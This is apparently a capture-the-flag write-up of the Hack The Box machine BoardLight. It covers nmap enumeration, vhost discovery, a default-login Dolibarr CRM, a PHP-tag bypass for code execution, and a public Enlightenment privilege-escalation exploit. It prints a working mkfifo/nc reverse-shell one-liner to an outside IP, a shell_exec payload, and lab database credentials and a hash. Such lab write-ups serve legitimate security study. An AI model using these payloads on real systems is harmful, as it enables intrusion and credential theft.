# BoardLight

<figure><img src="../../.gitbook/assets/BoardLight (1).png" alt=""><figcaption></figcaption></figure>

## &#x20;Enumeration

```bash
nmap -v -A -O -p- -Pn boardlight.htb -oN nmap
```

```bash
Nmap scan report for boardlight.htb (10.10.11.11)
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/7%OT=22%CT=1%CU=38364%PV=Y%DS=2%DC=T%G=Y%TM=66631
OS:D7C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=101%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CS
OS:T11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E
OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Uptime guess: 0.076 days (since Fri Jun  7 14:58:20 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   51.51 ms 10.10.14.1
2   51.85 ms boardlight.htb (10.10.11.11)

NSE: Script Post-scanning.
Initiating NSE at 16:47
Completed NSE at 16:47, 0.00s elapsed
Initiating NSE at 16:47
Completed NSE at 16:47, 0.00s elapsed
Initiating NSE at 16:47
Completed NSE at 16:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.35 seconds
           Raw packets sent: 65723 (2.896MB) | Rcvd: 66121 (2.754MB)

```



### Port 80

<figure><img src="../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

It appears to be a simple showcase site, and even a directory scan with `ffuf` returns nothing.

Trying to scan vhosts always with ffuf we get nothing. This is very strange... 🤔

Let's go back to the homepage and see if we can extract additional information such as employees, additional domain names, etc.

In the footer we see that the domain name is not `boardlight.htb` but `board.htb`:

<figure><img src="../../.gitbook/assets/image (727).png" alt=""><figcaption></figcaption></figure>

At this point trying to run a new scan of possible vhosts immediately ffuf returns something super interesting:

<figure><img src="../../.gitbook/assets/image (726).png" alt=""><figcaption></figcaption></figure>

Adding `crm.board.htb` to /etc/hosts and visiting the URL we will reach a login page :thumbsup:

<figure><img src="../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

This is the login page of Dolibarr ERP/CRM which is an Open source modular software that suits small and medium-sized enterprises (SMEs), foundations and freelancers.

## Foothold

Trying `admin:admin` credentials we can enter in a sort of restricted area of CRM:

<figure><img src="../../.gitbook/assets/image (729).png" alt=""><figcaption></figcaption></figure>

But is still possible to create website and under each website a test page. In fact, if we create a new website and create a blank page with some HTML code this will be visible from the browser:

<figure><img src="../../.gitbook/assets/image (731).png" alt=""><figcaption></figcaption></figure>

By clicking on the preview symbol to the right of the page :binocul or by reaching the correctly set URL, the created page can be viewed:

<figure><img src="../../.gitbook/assets/image (732).png" alt=""><figcaption></figcaption></figure>

The juiciest and most interesting thing of all though is that it is possible to create pages with dynamic content in other words with PHP code that could get us a reverse shell.&#x20;

But if we try to enter some PHP code using the classic tag we obtain the following error:

<figure><img src="../../.gitbook/assets/image (733).png" alt=""><figcaption></figcaption></figure>

The good news, however, is that there is a vulnerability that allow us to easily bypass this restriction and the reference is this one:

{% embed url="https://www.swascan.com/it/security-advisory-dolibarr-17-0-0/" %}

<figure><img src="../../.gitbook/assets/image (730).png" alt=""><figcaption></figcaption></figure>

Easy Peasy! :wave:

<figure><img src="../../.gitbook/assets/image (734).png" alt=""><figcaption></figcaption></figure>

This is the payload used to exec some shell commands on backend:

```php
<?PHP $output = shell_exec('which python');echo "<pre>$output</pre>";?> 

```

List files in the current working directory:&#x20;

<figure><img src="../../.gitbook/assets/image (735).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (736).png" alt=""><figcaption></figcaption></figure>

We can list the users on the machine and we will find larissa:

<figure><img src="../../.gitbook/assets/image (737).png" alt=""><figcaption></figcaption></figure>

Verify if some useful binaries exists:

<figure><img src="../../.gitbook/assets/image (738).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (739).png" alt=""><figcaption></figcaption></figure>

after several attempts we finally find the reverse shell working and get a session in pwncat:

```php
<?PHP system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.101 9999 >/tmp/f");?>
```

Googling ([https://wiki.dolibarr.org/index.php?title=Configuration\_file](https://wiki.dolibarr.org/index.php?title=Configuration_file)) we find that Dollibarr's configuration file is in `conf/conf.php` as shown in the figure:

<figure><img src="../../.gitbook/assets/image (740).png" alt=""><figcaption></figcaption></figure>

And the first credential set appear magically :magic\_wand::

<figure><img src="../../.gitbook/assets/image (741).png" alt=""><figcaption></figcaption></figure>

`dolibarrowner` <--> `serverfun2$2023!!`

## Privilege Escalation (user)

The first idea was to enumerate further by checking for other users within the MySQL database:

<figure><img src="../../.gitbook/assets/image (742).png" alt=""><figcaption></figcaption></figure>

With `show tables;` we can list the tables present in this database:

<figure><img src="../../.gitbook/assets/image (743).png" alt=""><figcaption></figcaption></figure>

`llx_user` is the most interesting table but difficult to read using the reverse shell:

<figure><img src="../../.gitbook/assets/image (744).png" alt=""><figcaption></figcaption></figure>

If we copy this output to a mysql editor formatter like this one we can easily read the password hashes and users:

{% embed url="https://www.dpriver.com/pp/sqlformat.htm" %}

<figure><img src="../../.gitbook/assets/image (745).png" alt=""><figcaption></figcaption></figure>

```
dolibarr $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm
```

It's a Blowfish hash type:

<figure><img src="../../.gitbook/assets/image (746).png" alt=""><figcaption></figcaption></figure>

Try to crack it using Hashcat is a fail :no\_entry:

Instead if we simply try to SSH with this password as `larissa` user  enumerated before we obtain the user flag:

<figure><img src="../../.gitbook/assets/image (747).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation (root)

Download `linpeas.sh` under `/tmp` and start it:

<figure><img src="../../.gitbook/assets/image (748).png" alt=""><figcaption></figcaption></figure>

After trying several different avenues (from port 33060 open only in localhost to the different CVEs listed but not compatible with the Ubuntu Focal 21.04 version of the machine) and many hours of reviewing linpeas output came <mark style="color:yellow;">**enlightenment**</mark>! :bulb:

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main" %}

{% hint style="info" %}
Enlightenment is a Window Manager, Compositor and Minimal Desktop for Linux (the primary platform), BSD and any other compatible UNIX system.
{% endhint %}

Using the exploit found on GitHub we can obtain the root flag :tada:

<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
